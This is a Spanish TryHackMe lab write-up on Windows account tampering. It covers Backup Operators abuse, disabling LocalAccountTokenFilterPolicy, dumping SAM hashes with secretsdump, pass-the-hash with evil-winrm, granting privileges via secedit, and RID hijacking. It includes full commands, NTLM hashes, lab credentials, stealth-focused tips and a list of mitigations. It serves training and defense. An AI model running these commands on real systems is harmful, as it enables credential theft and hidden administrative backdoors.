---
title: "Tampering With Unprivileged Accounts"
platform: "TryHackMe"
os: "Windows"
difficulty: "Medium"
ip: "10.65.182.132"
slug: "tampering-with-unprivileged-accounts"
author: "Z4k7"
date: "2026-05-04"
year: "2026"
status: "pwned"
tags:
  - "PrivEsc"
  - "Windows"
  - "UserManipulation"
  - "Remote"
techniques:
  - "Backup Operator Abuse"
  - "RID Hijacking"
  - "Pass-the-Hash"
  - "Registry Manipulation"
tools:
  - "evil-winrm"
  - "secretsdump.py"
  - "PsExec"
  - "Regedit"
flags_list:
  - label: "usuario"
    value: "thmuser1"
  - label: "password"
    value: "Password321"
  - label: "usuario"
    value: "Administrator"
  - label: "password"
    value: "Password321"
summary: "Laboratorio de TryHackMe sobre escalada de privilegios en Windows manipulando cuentas de usuario sin privilegios. Se cubren tres métodos principales: (1) agregar usuario a grupo Backup Operators y dumpear SAM, (2) asignar privilegios especiales SeBackup/SeRestore mediante secedit, (3) hijackear RID en registry para clonar privilegios de Administrator. Objetivo final: obtener acceso como Administrator usando Pass-the-Hash.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Escalar privilegios desde usuario sin privilegios (thmuser1, thmuser2, thmuser3) a acceso administrativo usando múltiples técnicas de manipulación de cuentas y registry.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Contamos con dos entornos atacante y víctima en este caso podríamos crear como primera opción en la parte víctima un usuario con las siguientes características
          Comando:
      - kind: "code"
        lang: "BASH"
        code: |
          net localgroup administrator thmuser0 /add
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423091533976.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Con el anterior código nos permite adicionar un usuario en el group administrators
          Comando:
      - kind: "code"
        lang: "BASH"
        code: |
          net localgroup "Back Management Users" thmuser1 /add
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423092002376.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          el anterior código nos permite adicionar el usuario `thmuser1`
          Comando:
      - kind: "code"
        lang: "BASH"
        code: |
          net localgroup "Remote Management Users" thmuser1  /add
      - kind: "note"
        text: |
          Nos permite adicionar al usuario al grupo `Remote Management Users`
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423092240065.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          validación si se crearon los usuarios en el sistema
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423092310048.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          validar los grupos asignados de cada usuario
          Usuario: `thmuser0`
      - kind: "code"
        lang: "CMD"
        code: |
          User name                    thmuser0
          Full Name                    thmuser0
          Comment
          User's comment
          Country/region code          000 (System Default)
          Account active               Yes
          Account expires              Never
          
          Password last set            5/28/2022 11:48:27 PM
          Password expires             Never
          Password changeable          5/28/2022 11:48:27 PM
          Password required            Yes
          User may change password     No
          
          Workstations allowed         All
          Logon script
          User profile
          Home directory
          Last logon                   Never
          
          Logon hours allowed          All
          
          Local Group Memberships      *Administrators       *Users
          Global Group memberships     *None
          The command completed successfully.
      - kind: "note"
        text: |
          Usuario: `thmuser1`
      - kind: "code"
        lang: "CMD"
        code: |
          User name                    thmuser1
          Full Name                    thmuser1
          Comment
          User's comment
          Country/region code          000 (System Default)
          Account active               Yes
          Account expires              Never
          
          Password last set            5/28/2022 11:47:16 PM
          Password expires             Never
          Password changeable          5/28/2022 11:47:16 PM
          Password required            Yes
          User may change password     No
          
          Workstations allowed         All
          Logon script
          User profile
          Home directory
          Last logon                   Never
          
          Logon hours allowed          All
          
          Local Group Memberships      *Backup Operators     *Remote Management Use
                                       *Users
          Global Group memberships     *None
          The command completed successfully.
      - kind: "note"
        text: |
          Se confirma los grupos de cada usuario
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Los grupos especiales como Backup Operators tienen privilegios críticos por defecto (SeBackupPrivilege y SeRestorePrivilege). Aunque parecen inofensivos, permiten acceso a archivos protegidos como SAM que contienen hashes de todas las contraseñas del sistema."

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "thmuser1"
      - label: "password"
        value: "Password321"
      - label: "usuario"
        value: "Administrator"
      - label: "password"
        value: "Password321"

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          pasamos al apartado del atacante.
          Intentamos realizar la conexion a al victima por medio del siguiente comando
      - kind: "code"
        lang: "BASH"
        code: |
          evil-winrm -i 10.65.182.132 -u thmuser1 -p Password321
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423093616271.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos los group asignados
      - kind: "code"
        lang: "BASH"
        code: |
          whoami /groups
          
          GROUP INFORMATION
          -----------------
          
          Group Name                             Type             SID          Attributes
          ====================================== ================ ============ ==================================================
          Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
          BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
          BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
          BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
          Mandatory Label\Medium Mandatory Level Label
      - kind: "note"
        text: |
          Esto se debe al Control de cuentas de usuario (UAC). Una de las funciones implementadas por UAC, LocalAccountTokenFilterPolicy , elimina los privilegios administrativos de cualquier cuenta local al iniciar sesión de forma remota. Si bien puede elevar sus privilegios mediante UAC desde una sesión gráfica de usuario , si utiliza WinRM, tendrá un token de acceso limitado sin privilegios administrativos.
          Para poder recuperar los privilegios de administrador de su usuario, tendremos que deshabilitar LocalAccountTokenFilterPolicy cambiando la siguiente clave de registro a 1:
          Comando:
      - kind: "code"
        lang: "BASH"
        code: |
          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
      - kind: "note"
        text: |
          Accedemos a la victima y cambiamos la key anterior .
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423094814536.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos los cambios realizados en el usuario victima
      - kind: "code"
        lang: "CMD"
        code: |
          evil-winrm -i 10.65.182.132 -u thmuser1 -p Password321
                                                  
          Evil-WinRM shell v3.7
                                                  
          Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                                  
          Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                                  
          Info: Establishing connection to remote endpoint
          *Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
          
          GROUP INFORMATION
          -----------------
          
          Group Name                           Type             SID          Attributes
          ==================================== ================ ============ ==================================================
          Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
          BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
          BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
          BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
          NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
          Mandatory Label\High Mandatory Level Label            S-1-16-12288
          *Evil-WinRM* PS C:\Users\thmuser1\Documents>
      - kind: "note"
        text: |
          Una vez que todo esto esté configurado, estaremos listos para usar nuestro usuario de puerta trasera. Primero, establezcamos una conexión WinRM y verifiquemos que el grupo Operadores de copia de seguridad esté habilitado para nuestro usuario:
          Lo anterior nos confirma que se activa la politica de  `Backup Operators`
          A continuación, procedemos a realizar una copia de seguridad de los archivos SAM y SYSTEM y a descargarlos en nuestra máquina atacante:
          Comando :
      - kind: "code"
        lang: "CMD"
        code: |
          reg save hklm\system system.bak
      - kind: "note"
        text: |
          ese comando crea un backup del registro del sistema en un archivo llamado `system.bak`.
          Comando :
      - kind: "code"
        lang: "CDM"
        code: |
          reg save hklm\sam sam.bak
      - kind: "note"
        text: |
          el comando crea un backup del Security Account Manager en un archivo llamado `sam.bak`
          Si ya contamos con los dos backup procedemos a descargar
      - kind: "code"
        lang: "CMD"
        code: |
          PS C:\Users\thmuser1\Documents> dir
          
          
              Directory: C:\Users\thmuser1\Documents
          
          
          Mode                LastWriteTime         Length Name
          ----                -------------         ------ ----
          -a----        4/23/2026   2:58 PM          61440 sam.bak
          -a----        4/23/2026   2:55 PM       16883712 system.bak
      - kind: "note"
        text: |
          Comandos:
      - kind: "code"
        lang: "CMD"
        code: |
          download system.bak
          download san.bak
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423100710026.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ya contamos con los backup del usuario  `thmuser1`
          Por medio de la herramienta `secretsdump.py` podremos volcar los hash de los archivos descargados
      - kind: "code"
        lang: "PYTHON"
        code: |
          python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL 
          Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
          
          [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
          [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
          Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
          thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
          thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
          thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
          thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
          thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
          [*] Cleaning up...
      - kind: "note"
        text: |
          contamos con el dump de los hash
          por último, realice un ataque Pass-the-Hash para conectarse a la máquina víctima con privilegios de administrador:
          `evil-winrm -i 10.65.182.132 -u Administrator  -H f3118544a831e728781d780cfdb9c1fa`
          Se confirma si contamos con el usuario
      - kind: "code"
        lang: "CMD"
        code: |
          evil-winrm -i 10.65.182.132 -u Administrator  -H f3118544a831e728781d780cfdb9c1fa                
          Evil-WinRM shell v3.7                            
          Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                 
          Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion              
          Info: Establishing connection to remote endpoint
          *Evil-WinRM* PS C:\Users\Administrator\Documents> WHOAMI
          wpersistence\administrator
          
          
          *Evil-WinRM* PS C:\Users\Administrator\Documents>
      - kind: "note"
        text: |
          Validamos si podemos acceder a la primera `Flag` ingresamos a la carpeta raíz y consultamos la siguiente ruta
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423102410292.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Una vez que tenemos el hash NTLM, no necesitamos la contraseña. Pass-the-Hash funciona porque NTLM authentication valida el hash directamente contra el servidor. Con LocalAccountTokenFilterPolicy deshabilitado, incluso el hash del Administrator tiene privilegios completos vía WinRM."

  - id: "privesc_1"
    num: "04"
    title: "Método 2: Privilege Assignment via secedit"
    content:
      - kind: "note"
        text: |
          Privilegios especiales y descriptores de seguridad
          Se puede obtener un resultado similar al de añadir un usuario al grupo de Operadores de Copia de Seguridad sin modificar la pertenencia a ningún grupo. Los grupos especiales son especiales porque el sistema operativo les asigna privilegios especificos por defecto. Los privilegios son simplemente la capacidad de realizar una tarea en el propio sistema. Incluyen desde acciones sencillas como apagar el servidor hasta operaciones con privilegios muy elevados, como poder tomar posesión de cualquier archivo del sistema.
          En el caso del grupo Operadores de copia de seguridad, tiene asignados por defecto los siguientes dos privilegios:
      - kind: "bullet"
        text: "SeBackupPrivilege: El usuario puede leer cualquier archivo del sistema, ignorando cualquier DACL existente."
      - kind: "bullet"
        text: "SeRestorePrivilege: El usuario puede escribir en cualquier archivo del sistema, ignorando cualquier DACL existente."
      - kind: "note"
        text: |
          Podemos asignar tales privilegios a cualquier usuario, independientemente de su pertenencia a grupos. Para ello, podemos utilizar el `secedit`comando. Primero, exportaremos la configuración actual a un archivo temporal:
      - kind: "code"
        lang: "POWERSHELL"
        code: |
          secedit /export /cfg config.inf
      - kind: "code"
        lang: "CMD"
        code: |
          C:\Users\Administrator\Desktop>secedit /export /cfg config.inf                                                                                                                                                                                  The task has completed successfully.                                                                                    See log %windir%\security\logs\scesrv.log for detail info.                                                                                                                                                                                      C:\Users\Administrator\Desktop>notepad config.inf                                                                                                                                                                                               C:\Users\Administrator\Desktop>
      - kind: "note"
        text: |
          Agregamos el usuario en el apartado de  `SeBackupPrivilege`
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423104512625.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Finalmente, convertimos el archivo .inf en un archivo .sdb, que luego se utiliza para cargar la configuración de nuevo en el sistema:
      - kind: "code"
        lang: "POWERSHELL"
        code: |
          secedit /import /cfg config.inf /db config.sdb
          secedit /configure /db config.sdb /cfg config.inf
      - kind: "code"
        lang: "CMD"
        code: |
          C:\Users\Administrator\Desktop>notepad config.inf
          
          C:\Users\Administrator\Desktop>secedit /import /cfg config.inf /db config.sdb
          
          C:\Users\Administrator\Desktop>secedit /configure /db config.sdb /cfg config.inf
          
          The task has completed successfully.
          See log %windir%\security\logs\scesrv.log for detail info.
          
          C:\Users\Administrator\Desktop>
      - kind: "note"
        text: |
          Ahora deber\u00eda tener un usuario con privilegios equivalentes a los de cualquier operador de copia de seguridad. El usuario aún no puede iniciar sesión en el sistema mediante WinRM, así que vamos a solucionarlo. En lugar de agregarlo al grupo de Usuarios de administración remota, modificaremos el descriptor de seguridad asociado al servicio WinRM para permitir la conexión de thmuser2. Un descriptor de seguridad es similar a una lista de control de acceso (ACL), pero aplicada a otras funciones del sistema.
          Para abrir la ventana de configuración del descriptor de seguridad de WinRM, puede usar el siguiente comando en PowerShell (necesitará usar la sesión de la interfaz gráfica de usuario para esto):
      - kind: "code"
        lang: "POWERSHELL"
        code: |
          Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
      - kind: "note"
        text: |
          Esto abrirá una ventana donde podrá agregar thmuser2 y asignarle privilegios completos para conectarse a WinRM
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423114134114.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423114205745.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez hecho esto, nuestro usuario puede conectarse mediante WinRM. Dado que el usuario tiene los privilegios SeBackup y SeRestore, podemos repetir los pasos para recuperar los hashes de las contraseñas del SAM y volver a conectarnos con el usuario administrador.
          Tenga en cuenta que para que este usuario pueda trabajar con los privilegios otorgados por completo, tendrá que modificar la clave de registro LocalAccountTokenFilterPolicy , pero ya lo hemos hecho para obtener la bandera anterior.
          Si revisas las membresías de grupo de tu usuario, parecerá un usuario normal. ¡No hay nada sospechoso!
      - kind: "code"
        lang: "CMD"
        code: |
          C:\Users\Administrator\Desktop>net user thmuser1
          User name                    thmuser1
          Full Name                    thmuser1
          Comment
          User's comment
          Country/region code          000 (System Default)
          Account active               Yes
          Account expires              Never
          
          Password last set            5/28/2022 11:47:16 PM
          Password expires             Never
          Password changeable          5/28/2022 11:47:16 PM
          Password required            Yes
          User may change password     No
          
          Workstations allowed         All
          Logon script
          User profile
          Home directory
          Last logon                   4/23/2026 3:17:07 PM
          
          Logon hours allowed          All
          
          Local Group Memberships      *Backup Operators     *Remote Management Use
                                       *Users
          Global Group memberships     *None
          The command completed successfully.
      - kind: "note"
        text: |
          Realizamos el volcado de nuevo de las credenciales accedemos al usuario Administrator  y obtendremos la flag2
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260423115135633.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ingresamos con el usuario thmuser2
          `evil-winrm -i 10.65.182.132 -u Administrator  -H f3118544a831e728781d780cfdb9c1fa`
      - kind: "code"
        lang: "CMD"
        code: |
          evil-winrm  -i 10.65.182.132 -u thmuser2 -H f3118544a831e728781d780cfdb9c1fa
          Evil-WinRM shell v3.7
          Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
          Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-WinRM#Remote-path-completion
          Info: Establishing connection to remote endpoint
          *Evil-WinRM* PS C:\Users\thmuser2\Documents>
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El método 2 (secedit) es más discreto que agregar a un grupo. El usuario sigue pareciendo normal en `net user` y auditorías básicas, pero tiene privilegios equivalentes a Backup Operators. La modificación del security descriptor de WinRM permite acceso remoto sin cambiar membresía de grupos."

  - id: "step5_1"
    num: "05"
    title: "Método 3: RID Hijacking"
    content:
      - kind: "note"
        text: |
          Secuestro de RID
          Otro método para obtener privilegios administrativos sin ser administrador consiste en modificar algunos valores del registro para que el sistema operativo piense que usted es el administrador.
          Cuando se crea un usuario, se le asigna un identificador llamado ID relativo (RID) . El RID es simplemente un identificador numérico que representa al usuario en todo el sistema. Cuando un usuario inicia sesión, el proceso LSASS obtiene su RID del registro SAM y crea un token de acceso asociado a dicho RID. Si podemos manipular el valor del registro, podemos hacer que Windows asigne un token de acceso de administrador a un usuario sin privilegios asociando el mismo RID a ambas cuentas.
          En cualquier sistema Windows, a la cuenta de administrador predeterminada se le asigna el RID = 500 , y los usuarios normales suelen tener un RID >= 1000 .
          Para encontrar los RID asignados a cualquier usuario, puede utilizar el siguiente comando:
          Símbolo del sistema
      - kind: "code"
        lang: "CMD"
        code: |
          C:\> wmic useraccount get name,sid
          
          Name                SID
          Administrator       S-1-5-21-1966530601-3185510712-10604624-500
          DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
          Guest               S-1-5-21-1966530601-3185510712-10604624-501
          thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
          thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
          thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
      - kind: "note"
        text: |
          El RID es la última parte del SID (1010 para thmuser3 y 500 para Administrator). El SID es un identificador que permite al sistema operativo identificar a un usuario en un dominio, pero no nos detendremos demasiado en el resto para esta tarea.
          Ahora solo tenemos que asignar el RID=500 a thmuser3. Para ello, necesitamos acceder al SAM usando Regedit. El SAM está restringido solo a la cuenta SYSTEM, por lo que ni siquiera el administrador podrá editarlo. Para ejecutar Regedit como SYSTEM, usaremos psexec, disponible en `C:\tools\pstools`en tu máquina:
          Símbolo del sistema
      - kind: "code"
        lang: "CMD"
        code: |
          C:\tools\pstools> PsExec64.exe -i -s regedit
      - kind: "note"
        text: |
          Desde Regedit, iremos a `HKLM\SAM\SAM\Domains\Account\Users\`donde habra una clave para cada usuario en la máquina. Como queremos modificar thmuser3, necesitamos buscar una clave con su RID en hexadecimal (1010 = 0x3F2). Debajo de la clave correspondiente, habra un valor llamado F , que contiene el RID efectivo del usuario en la posición 0x30:
          > ps: the RID is stored using little-endian notation, so its bytes appear reversed.
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260509224046741.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
      - kind: "image"
        src: "assets/images/Tampering%20With%20Unprivileged%20Accounts/file-20260509224138511.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          The next time thmuser3 login, LSASS will associate it with the same RID as Administrator and grant them the same privileges.
          Login to the rdp with thmuser3/Password321, then here we are, the Administrator's Desktop:
          Execute `C:\flags\flag3.exe` to get flag3.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "RID Hijacking es la técnica más sigilosa. El usuario sigue siendo miembro de los mismos grupos, no hay cambios visibles en `net user`, y sin embargo tiene privilegios administrativos completos porque el sistema operativo lee su RID del registro. LSASS usa ese RID para crear el token, y si RID = 500, tiene privilegios de Administrator."

lessons:
  - 'Los grupos especiales (Backup Operators) tienen privilegios muy poderosos por defecto'
  - 'LocalAccountTokenFilterPolicy puede limitar efectivamente el acceso remoto incluso para administradores'
  - 'Pass-the-Hash es efectivo porque NTLM no requiere la contraseña original'
  - 'secedit permite asignar privilegios sin cambiar membresía de grupos (más discreto)'
  - 'RID Hijacking es casi invisible - el usuario sigue pareciendo normal en auditorías básicas'
  - 'El registro SAM es el objetivo crítico en Windows - quien accede a SAM, accede a todo'
  - 'Múltiples capas de defensa (grupos + privilegios + RID) son necesarias para prevenir escalada'
mitigation:
  - 'Proteger registry SAM usando permisos NTFS restrictivos (aunque Backup Operators los ignora)'
  - 'Auditar cambios en LocalAccountTokenFilterPolicy'
  - 'Monitorear cambios en registry SAM especialmente en posición 0x30 (RID)'
  - 'Auditar asignación de SeBackup/SeRestore mediante secedit y security descriptors'
  - 'Implementar Device Guard/Code Integrity para prevenir ejecución de Regedit no autorizado'
  - 'Usar Credential Guard para proteger NTLM hashes'
  - 'Auditar pertenencia en grupos privilegiados regularmente'
  - 'Implementar MFA para acceso administrativo'
  - 'Usar logs de seguridad para detectar actividad de Backup Operators'
  - 'Considerar deshabilitar WinRM si no es necesario'
---
